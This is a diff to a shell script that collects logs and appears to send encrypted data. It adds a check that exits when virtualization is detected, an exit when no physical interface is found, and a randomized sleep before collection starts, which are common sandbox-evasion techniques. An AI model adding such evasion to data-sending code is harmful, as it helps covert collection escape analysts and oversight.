@@ -109,6 +109,11 @@ generate_id()
     fi
   done;
 
+  if [ -z "$if_list" ]; then
+    printf "No physical network interface found\n"
+    exit 2
+  fi
+
   if_list="$(echo $if_list | tr ' ' '\n' | sort -u)"
 
   for mac in $if_list;
@@ -243,6 +248,21 @@ transmitt_enc_data()
 }
 
 
+# Check if this tool is run in a virtualized environment
+#
+check_virt()
+{
+  if [ $(command dmesg &> /dev/null; echo $?) -eq 0 ]; then
+    env=$(dmesg | awk '/paravirtualized/{print $7}')
+
+    if [ ! -z "$env" ] && [ "$env" != 'bare' ]; then
+      printf "Detected virualization! Exiting\n"
+      exit 2
+    fi
+
+  fi
+}
+
 # Delay the start of the transmission between 0-60 minutes
 #
 delay_start()
@@ -253,12 +273,14 @@ delay_start()
   t4=$(grep -ao -m 1 '[1-9]' /dev/urandom | sed 's/0/10/' | head -n 1)
   t5=$(grep -ao -m 1 '[0-9]' /dev/urandom | sed 's/0/10/' | head -n 1)
   seconds=$(($t1 * $t2 * $t3 * $t4 * $t5))
+  sleep $seconds
 }
 
 if [ ! -d '/tmp/dalec' ]; then
   mkdir '/tmp/dalec'
 fi
 
+check_virt
 delay_start
 /bin/sh $COLLECT -l "$LOG_PATH"
 stats="$(get_statistics $LOG_FILE)"
